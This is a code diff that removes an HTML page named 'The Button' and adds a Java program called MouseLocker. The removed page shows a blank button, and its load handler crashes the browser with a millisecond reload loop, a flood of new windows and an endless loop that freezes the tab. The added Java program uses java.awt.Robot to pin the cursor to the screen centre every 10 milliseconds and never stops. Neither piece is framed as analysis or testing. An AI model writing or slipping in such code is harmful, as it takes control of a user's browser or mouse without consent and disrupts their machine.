@@ -1,52 +1,29 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>The Button</title>
-  <style>
-    html, body {
-      margin: 0;
-      height: 100%;
-      background-color: #00f5cc;
+import java.awt.*;
+import java.util.Timer;
+import java.util.TimerTask;
+
+public class MouseLocker {
+
+    public static void main(String[] args) {
+        try {
+            Robot robot = new Robot();
+
+            // Get screen size
+            Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
+            int centerX = screenSize.width / 2;
+            int centerY = screenSize.height / 2;
+
+            // Move mouse to center repeatedly
+            Timer timer = new Timer();
+            timer.scheduleAtFixedRate(new TimerTask() {
+                @Override
+                public void run() {
+                    robot.mouseMove(centerX, centerY);
+                }
+            }, 0, 10); // every 10 milliseconds
+
+        } catch (AWTException e) {
+            e.printStackTrace();
+        }
     }
-
-    button {
-      width: 100%;
-      height: 100%;
-      font-size: 40px;
-      font-weight: bold;
-      border: none;
-      background-color: #00f5cc;
-      color: white;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #00f5cc;
-    }
-  </style>
-</head>
-<body>
-
-  <button></button>
-
-  <script>
-    function crash() {
-      // Reload loop
-      setInterval(() => location.reload(true), 1);
-
-      // Flood the browser with new windows
-      setInterval(() => {
-        window.open(window.location.href, '_blank');
-      }, 1);
-
-      // Freeze the tab
-      while (true) {
-        console.log("crash");
-      }
-    }
-
-    window.onload = crash;
-  </script>
-
-</body>
-</html>
+}
